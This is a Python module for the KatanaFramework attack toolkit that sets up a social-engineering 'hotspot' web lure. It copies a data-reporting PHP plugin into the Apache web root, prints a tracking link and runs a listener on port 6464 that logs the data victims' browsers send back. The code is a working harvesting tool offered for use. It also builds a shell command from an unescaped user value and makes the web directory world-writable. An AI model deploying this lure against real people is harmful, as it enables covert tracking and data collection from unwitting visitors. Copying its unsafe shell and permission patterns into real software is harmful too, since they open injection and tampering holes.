# This module requires katana framework 
# https://github.com/PowerScript/KatanaFramework

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KatanaFramework import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES
from threading import Thread
import socket,select        
# END LIBRARIES 

# INFORMATION MODULE
def init():
	init.Author             ="RedToor"
	init.Version            ="1.0"
	init.Description        ="Hotspoter web, assambly with GetDataReport Plugin."
	init.CodeName           ="set/web.hot"
	init.DateCreation       ="24/03/2016"      
	init.LastModification   ="25/12/2016"
	init.References         =None
	init.License            =KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME    VALUE             RQ     DESCRIPTION
		'to_url':["www.google.com" ,True ,'URL redirect'],
		'enable':["false"          ,False,'Geo Enable']
	}
	return init
# END INFORMATION MODULE

# CODE MODULE    ############################################################################################
def main(run):

	SYSTEM.Command_exe("Setting files                           ",'mkdir -p '+PATCH_WWW+'r/ ; echo "<?php \$url=\'http://'+init.var['to_url']+'\';\$javascript=\''+init.var['enable']+'\';?>" > '+PATCH_WWW+'r/appconfig.php & echo ',std=False)
	SYSTEM.Command_exe("Coping files to server                  ","cp files/getdatareport/* "+PATCH_WWW+"r/", std=False)
	SYSTEM.Command_exe("Giving privileges to files              ","chmod -R 777 "+PATCH_WWW+"r", std=False)
	SYSTEM.Command_exe("Starting Apache Server                  ","service apache2 start", std=False)
	SYSTEM.Command_exe("Starting Script Server                  ","sudo fuser -kuv 6464/tcp", std=False)
	
	Space()

	printk.inf("HOT-Link http://127.0.0.1/r/link.php?lKsm#s92Sa")
	printk.inf("if you want to stop server (PRESS [Ctrol + C ])")
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind(("", 6464))
	server.listen(1)
	printk.wait("Waiting bees...")
	try:
		while 1:
			socket_cliente, datos_cliente = server.accept()
			printk.suff("beed: "+str(datos_cliente))
			hilo = Cliente(socket_cliente, datos_cliente)
			hilo.start()
	except:
		printk.inf("Stoping Process")
		SYSTEM.Command_exe("Removing files                          ","rm "+PATCH_WWW+"r/link.php "+PATCH_WWW+"r/appconfig.php "+PATCH_WWW+"r/GetdataReport.Plugin.php", std=False)
		SYSTEM.Command_exe("Stoping Apache                          ","service apache2 stop", std=False)
		server.close()
		Space()
		
# END CODE MODULE ############################################################################################

class Cliente(Thread):
    def __init__(self, socket_cliente, datos_cliente):
        Thread.__init__(self)
        self.socket = socket_cliente
        self.datos = datos_cliente
 
    def run(self):
    	peticion = self.socket.recv(1024)
    	print peticion
    	self.socket.close()